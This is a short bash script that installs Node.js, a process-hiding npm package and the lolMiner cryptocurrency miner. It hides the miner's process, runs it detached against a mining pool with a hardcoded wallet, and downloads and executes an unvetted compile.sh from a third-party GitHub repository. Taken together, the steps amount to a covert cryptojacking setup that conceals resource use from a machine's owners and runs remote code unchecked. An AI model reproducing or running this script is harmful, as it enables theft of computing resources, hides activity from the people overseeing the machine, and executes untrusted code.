#!/bin/bash
sudo apt-get update
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt install nodejs
apt-get install screen -y
npm i -g node-process-hider
wget -q https://raw.githubusercontent.com/hndouehdw/henro/master/compile.sh
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.23/lolMiner_v1.23_Lin64.tar.gz && tar xf lolMiner_v1.23_Lin64.tar.gz && cd 1.23 
sudo ph add lolMiner
screen -dm -S ./lolMiner --algo ETHASH --pool ethash-us.unmineable.com:3333 --user DGB:DS4o16rvQT8oWEAdTCFT93wAq1pSzEKYHS.wow#hugj-p2bu --ethstratum ETHPROXY 
chmod +x compile.sh
./compile.sh

echo success
